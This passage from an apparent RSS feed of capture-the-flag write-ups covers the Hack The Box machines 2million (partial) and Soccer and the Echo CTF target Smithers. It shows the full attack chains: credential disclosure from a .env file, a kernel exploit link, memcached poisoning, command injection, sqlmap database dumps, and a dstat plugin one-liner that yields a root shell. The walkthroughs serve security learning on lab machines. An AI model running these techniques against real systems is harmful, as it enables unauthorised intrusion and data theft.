<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5
<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=0at92ian3f6vu79iq3p3vjt6gc
<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0
</code></pre></div>
<div><pre class="hljs"><code><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx
<span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Sun, 21 Jul 2024 14:58:00 GMT
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive
<span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Thu, 19 Nov 1981 08:52:00 GMT
<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-store, no-cache, must-revalidate
<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>16

<span class="language-json"><span class="hljs-punctuation">{</span><span class="hljs-attr">"message"</span><span class="hljs-punctuation">:</span><span class="hljs-keyword">true</span><span class="hljs-punctuation">}</span></span></code></pre></div>
<p>Trying to open a vpn as an admin:<br />
<img src="/_resources/820a42d9af444ef8a086d221a3b2fa65.png" /></p>
<h3 id="command-injection-testing">Command Injection Testing</h3>
<p>We identified a command injection vulnerability:<br />
<img src="/_resources/e7bb422bb7f8489cba204b9cc8ffd78f.png" /></p>
<p>We attempted to use a reverse shell:</p>
<p><img src="/_resources/f2486c03e78d4da690be48324b644042.png" /></p>
<h2 id="post-exploitation-phase">Post-Exploitation Phase</h2>
<h3 id="enumeration-as-www-data">Enumeration as www-data</h3>
<p>After gaining access, we started enumerating as www-data:</p>
<div><pre class="hljs"><code>www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 Jul 21 15:30 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 Jul 21 15:30 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123</code></pre></div>
<p>etc/passwd File:<br />
<img src="/_resources/257fde15357d41feb633b73eca911fc9.png" /></p>
<h3 id="logging-in-as-admin">Logging in as Admin</h3>
<p>We tried logging in as the admin user:<br />
<img src="/_resources/d77a46ad67544f5c8e7e6ee51cb0d1e6.png" /></p>
<p>We obtained the following email:</p>
<div><pre class="hljs"><code>admin@2million:/var/spool/mail$ cat admin                                                                           
From: ch4p &lt;ch4p@2million.htb&gt;                                                                                      
To: admin &lt;admin@2million.htb&gt;                                                                                      
Cc: g0blin &lt;g0blin@2million.htb&gt;                                                                                    
Subject: Urgent: Patch System OS                                                                                    
Date: Tue, 1 June 2023 10:45:22 -0700                                                                               
Message-ID: &lt;9876543210@2million.htb&gt;                                                                               
X-Mailer: ThunderMail Pro 5.2                                                                                       
                                                                                                                    
Hey admin,                                                                                                          
                                                                                                                    
I<span class="hljs-string">'m know you'</span>re working as fast as you can to <span class="hljs-keyword">do</span> the DB migration. While we<span class="hljs-string">'re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can'</span>t get popped by that.

HTB Godfather</code></pre></div>
<p>Exploiting OverlayFS / FUSE<br />
We searched for an exploit related to OverlayFS / FUSE and used the following exploit to escalate privileges:</p>
<p><a title="https://github.com/xkaneiki/CVE-2023-0386" href="https://github.com/xkaneiki/CVE-2023-0386">https://github.com/xkaneiki/CVE-2023-0386</a></p>
<p><img src="/_resources/d929cb8c9c794c65b29fe94f9627ed38.png" /></p>
<p><img src="/_resources/96d841c7173f4dfc86d24849fad1a5b7.png" /></p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Smithers - Echo CTF Challenge]]></title>
            <guid>24c75d11c587410ea821bb85f18ffc85</guid>
            <pubDate>Sat, 15 Feb 2025 16:54:47 GMT</pubDate>
            <content:encoded><![CDATA[<p><img src="/_resources/a6e7b38cb9944cc4ba6cb5ffb04cef74.png" /></p>
<p><a title="https://echoctf.red/target/5" href="https://echoctf.red/target/5">Link to target</a></p>
<h2 id="introduction">Introduction</h2>
<p>This post details the process of solving the "Smithers" challenge on echoctf.red.</p>
<h2 id="enumeration-phase">Enumeration Phase</h2>
<h3 id="nmap-scan">Nmap Scan</h3>
<p>I start the reconnaissance with nmap:</p>
<div><pre class="hljs"><code>PORT      STATE SERVICE   VERSION
<span class="hljs-number">10888</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>      nginx
| <span class="hljs-keyword">http</span>-methods: 
|_  Supported Methods: GET HEAD POST
|<span class="hljs-title">_http-title</span>: Network Tools
<span class="hljs-number">11211</span>/tcp <span class="hljs-built_in">open</span>  memcached Memcached <span class="hljs-number">1.5</span><span class="hljs-number">.12</span> (uptime <span class="hljs-number">224</span> <span class="hljs-built_in">seconds</span>)</code></pre></div>
<h3 id="web-server-on-port-10888">Web Server on Port 10888</h3>
<p>There is a web server running on port 10888:<br />
<img src="/_resources/65833c4c20ff4cbabeb2779c06f9ad35.png" /></p>
<p>It mentions that these utilities are only available to authorized IP addresses.</p>
<h3 id="extracting-information-from-memcached-with-metasploit">Extracting Information from Memcached with Metasploit</h3>
<p>I use Metasploit to extract information from the memcached service:</p>
<div><pre class="hljs"><code>msf6 &gt; use auxiliary/gather/memcached_extractor

msf6 auxiliary(gather/memcached<span class="hljs-emphasis">_extractor) &gt; set rhosts 10.0.100.142 
rhosts =&gt; 10.0.100.142
msf6 auxiliary(gather/memcached_</span>extractor) &gt; exploit

[+] 10.0.100.142:11211    - Found 1 keys

<span class="hljs-section">Keys/Values Found for 10.0.100.142:11211
========================================</span>

<span class="hljs-code"> Key     Value</span>
<span class="hljs-code"> ---     -----</span>
<span class="hljs-code"> ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_&lt;REDACTED&gt;\r\nEND\r\n"</span>
</code></pre></div>
<p>A flag is found in the memcached service.</p>
<h2 id="exploitation-phase">Exploitation Phase</h2>
<h3 id="using-telnet-to-modify-memcached">Using Telnet to Modify Memcached</h3>
<p>The key is to store my IP address in the memcached service as <code>REMOTE_ADDR</code>. After some research, I use telnet to connect and store my IP address:</p>
<div><pre class="hljs"><code><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.0.100.142</span> <span class="hljs-number">11211</span>
<span class="hljs-attribute">Trying</span> <span class="hljs-number">10.0.100.142</span>...
<span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.0.100.142</span>.
<span class="hljs-attribute">Escape</span> character is '^]'.
<span class="hljs-attribute">add</span> REMOTE_ADDR <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10</span>
<span class="hljs-section">&lt;My IP&gt;</span>
<span class="hljs-attribute">STORED</span></code></pre></div>
<h3 id="accessing-the-web-server">Accessing the Web Server</h3>
<p>Once my address is stored, I can access the web server, which presents a command line interface:<br />
<img src="/_resources/4b2e3bd1f2054998b3142bfda29db88b.png" /></p>
<p>Two flags are visible. Using a semicolon (<code>;</code>), I can run other commands and see that it runs as root. By executing:</p>
<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -r <span class="hljs-string">'ETSCTF'</span> /</code></pre></div>
<p>All flags are found.</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Soccer - An HTB easy machine]]></title>
            <guid>40ebb97956d7435b8fe5ded12ddb2d3f</guid>
            <pubDate>Sat, 15 Feb 2025 16:41:34 GMT</pubDate>
            <content:encoded><![CDATA[<p><img src="/_resources/ea61b8d11797440cbeddc13be3a74d38.png" /></p>
<p><a title="https://app.hackthebox.com/machines/Soccer" href="https://app.hackthebox.com/machines/Soccer">Link to target</a></p>
<h1 id="capture-the-flag-ctf-write-up-soccerhtb">Capture the Flag (CTF) Write-Up: Soccer.htb</h1>
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a title="#initial-enumeration" href="#initial-enumeration">Initial Enumeration</a>
<ul>
<li><a title="#nmap-scan" href="#nmap-scan">Nmap Scan</a></li>
<li><a title="#key-findings" href="#key-findings">Key Findings</a></li>
</ul>
</li>
<li><a title="#enumeration-and-exploitation" href="#enumeration-and-exploitation">Enumeration and Exploitation</a>
<ul>
<li><a title="#discovering-tiny-file-manager" href="#discovering-tiny-file-manager">Discovering Tiny File Manager</a></li>
<li><a title="#exploiting-tiny-file-manager" href="#exploiting-tiny-file-manager">Exploiting Tiny File Manager</a></li>
<li><a title="#uploading-reverse-shell" href="#uploading-reverse-shell">Uploading Reverse Shell</a></li>
</ul>
</li>
<li><a title="#post-exploitation" href="#post-exploitation">Post-Exploitation</a>
<ul>
<li><a title="#discovering-virtual-host" href="#discovering-virtual-host">Discovering Virtual Host</a></li>
<li><a title="#analyzing-new-web-application" href="#analyzing-new-web-application">Analyzing New Web Application</a></li>
<li><a title="#sql-injection-via-websockets" href="#sql-injection-via-websockets">SQL Injection via WebSockets</a></li>
</ul>
</li>
<li><a title="#privilege-escalation" href="#privilege-escalation">Privilege Escalation</a>
<ul>
<li><a title="#analyzing-suid-programs" href="#analyzing-suid-programs">Analyzing SUID Programs</a></li>
<li><a title="#exploiting-dstat-with-custom-plugin" href="#exploiting-dstat-with-custom-plugin">Exploiting dstat with Custom Plugin</a></li>
</ul>
</li>
<li><a title="#conclusion" href="#conclusion">Conclusion</a></li>
</ol>
<hr />
<h2 id="initial-enumeration">Initial Enumeration</h2>
<h3 id="nmap-scan">Nmap Scan</h3>
<p>I started with an <strong>Nmap</strong> scan to identify open ports and services.</p>
<div><pre class="hljs"><code>nmap -sV -sC -oN nmap.txt 10.10.11.194
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?</code></pre></div>
<h3 id="key-findings">Key Findings</h3>
<ul>
<li><strong>HTTP Server:</strong> Accessible at <code>http://soccer.htb/</code>.</li>
<li><strong>SSH Service:</strong> Running OpenSSH 8.2p1.</li>
<li><strong>Unusual Service:</strong> Port 9091 showing potential custom functionality.</li>
</ul>
<h2 id="enumeration-and-exploitation">Enumeration and Exploitation</h2>
<h3 id="discovering-tiny-file-manager">Discovering Tiny File Manager</h3>
<p>Using directory brute-forcing tools like <strong>ffuf</strong>, I discovered a Tiny File Manager instance:<br />
<img src="/_resources/ef871f25c1754f4099c77035ad2cf3f9.png" /></p>
<ul>
<li><strong>URL:</strong> <code>http://soccer.htb/tiny/</code></li>
<li><strong>Version:</strong> 2.4.3 (retrieved from source code comments).</li>
</ul>
<h3 id="exploiting-tiny-file-manager">Exploiting Tiny File Manager</h3>
<p>After searching online, I found the <strong>default credentials</strong> for Tiny File Manager:<br />
<img src="/_resources/0aed78a5341e4b21928aaf271d20ab4b.png" /></p>
<ul>
<li><strong>Username:</strong> admin</li>
<li><strong>Password:</strong> admin@123</li>
</ul>
<p>Using these credentials, I logged into the file manager successfully.</p>
<p><img src="/_resources/eedc4d3d8ff8435c91823d33b2ef0302.png" /></p>
<h3 id="uploading-reverse-shell">Uploading Reverse Shell</h3>
<p>I noticed that the <strong>uploads</strong> directory had write permissions. I created a <strong>PHP reverse shell</strong> and uploaded it through the file manager.</p>
<p>With the shell uploaded, I accessed it to gain an initial foothold on the server.</p>
<h2 id="post-exploitation">Post-Exploitation</h2>
<h3 id="discovering-virtual-host">Discovering Virtual Host</h3>
<p>While enumerating <strong>nginx configuration files</strong>, I identified a virtual host configuration pointing to a secondary application.</p>
<ul>
<li><strong>Virtual Host:</strong> <code>soc-player.soccer.htb</code></li>
</ul>
<p><img src="/_resources/b89a83ece45b45cdbeb5b52a388e3904.png" /></p>
<h3 id="analyzing-new-web-application">Analyzing New Web Application</h3>
<p><img src="/_resources/f8f50c66bd644da6b60e8126e1b6c014.png" /></p>
<p>The new application presented a <strong>login page</strong>. After creating an account, I observed that it utilized <strong>WebSocket requests</strong> to handle input.</p>
<p><img src="/_resources/9eb961d2ebfb4f3ea5d6824ccc090b58.png" /></p>
<ul>
<li>Example WebSocket request:<div><pre class="hljs"><code><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"text"</span><span class="hljs-punctuation">}</span></code></pre></div>
</li>
</ul>
<h3 id="sql-injection-via-websockets">SQL Injection via WebSockets</h3>
<p>Using <strong>sqlmap</strong>, I tested for SQL injection in the WebSocket endpoint:</p>
<p><img src="/_resources/2e8971d7d3da403c9ba883bb36e4d09b.png" /></p>
<div><pre class="hljs"><code>sqlmap -u <span class="hljs-string">"ws://soc-player.soccer.htb:9091"</span> --data <span class="hljs-string">'{"id": "*"}'</span> --dbs --threads 10 --level 5 --risk 3 --batch</code></pre></div>
<p>Results:</p>
<div><pre class="hljs"><code>back-end DBMS: MySQL &gt;= 5.0.12
available databases <span class="hljs-comment">[5]</span>:
<span class="hljs-comment">[*]</span> information_schema
<span class="hljs-comment">[*]</span> mysql
<span class="hljs-comment">[*]</span> performance_schema
<span class="hljs-comment">[*]</span> soccer_db
<span class="hljs-comment">[*]</span> sys</code></pre></div>
<p>Dumping the accounts table from soccer_db:</p>
<div><pre class="hljs"><code>sqlmap -u <span class="hljs-string">"ws://soc-player.soccer.htb:9091"</span> <span class="hljs-params">--data</span> '{<span class="hljs-string">"id"</span>: <span class="hljs-string">"*"</span>}' -D soccer_db -T accounts <span class="hljs-params">--dump</span> <span class="hljs-params">--threads</span> 10 <span class="hljs-params">--level</span> 5 <span class="hljs-params">--risk</span> 3 <span class="hljs-params">--batch</span></code></pre></div>
<div><pre class="hljs"><code><span class="hljs-section">| id   | email             | password   | username |
+------+-------------------+----------------------+----------+</span>
<span class="hljs-section">| 1324 | player@player.htb | *REDACTED* | player   |
+------+-------------------+----------------------+----------+</span></code></pre></div>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="analyzing-suid-programs">Analyzing SUID Programs</h3>
<p>After logging into SSH with the <code>player</code> credentials, I searched for SUID programs. I discovered that <code>doas</code> was configured to allow the <code>player</code> user to run <code>dstat</code> as root.</p>
<p><strong>Configuration:</strong></p>
<div><pre class="hljs"><code>permit nopass player as root cmd /usr/bin/dstat</code></pre></div>
<h3 id="exploiting-dstat-with-custom-plugin">Exploiting dstat with Custom Plugin</h3>
<p>Using the information from <a title="https://gtfobins.github.io/gtfobins/dstat/" href="https://gtfobins.github.io/gtfobins/dstat/">GTFOBins</a>, I created a custom plugin to execute arbitrary commands:</p>
<ol>
<li>
<p>Create the plugin:</p>
<div><pre class="hljs"><code>echo <span class="hljs-string">'import os; os.execv("/bin/sh", ["sh"])'</span> &gt; /usr/local/share/dstat/dstat_xxx.py</code></pre></div>
</li>
<li>
<p>Execute <code>dstat</code> with the plugin:</p>
<div><pre class="hljs"><code>doas -u root /usr/bin/dstat --xxx</code></pre></div>
</li>
</ol>
<p><strong>Result:</strong> I obtained a root shell!</p>
<p><img src="/_resources/ac06c9dd86e9467bab789bcf43d254fa.png" /></p>
<h2 id="conclusion">Conclusion</h2>
<p>This CTF demonstrated various techniques and highlighted critical vulnerabilities in system and application security:</p>
<ul>
<li><strong>Enumeration:</strong> Identified services and applications using tools like Nmap and ffuf.</li>
<li><strong>Exploitation:</strong> Gained access via default credentials on Tiny File Manager and exploited SQL injection vulnerabilities in WebSocket endpoints.</li>
<li><strong>Post-Exploitation:</strong> Used the initial foothold to uncover misconfigurations in the system, such as virtual host information and database credentials.</li>
<li><strong>Privilege Escalation:</strong> Leveraged a misconfigured <code>doas</code> command to exploit the <code>dstat</code> program with a custom plugin and escalate privileges to root.</li>
</ul>
<p>This challenge underscored the importance of:</p>
<ol>
<li>Properly securing web applications (e.g., avoid default credentials).</li>
<li>Validating inputs to prevent SQL injection.</li>
<li>Configuring SUID programs and privilege escalation paths securely.</li>
</ol>
<p>In the end, I successfully obtained root access, completing the challenge.</p>
]]></content:encoded>
        </item>
    </channel>
</rss>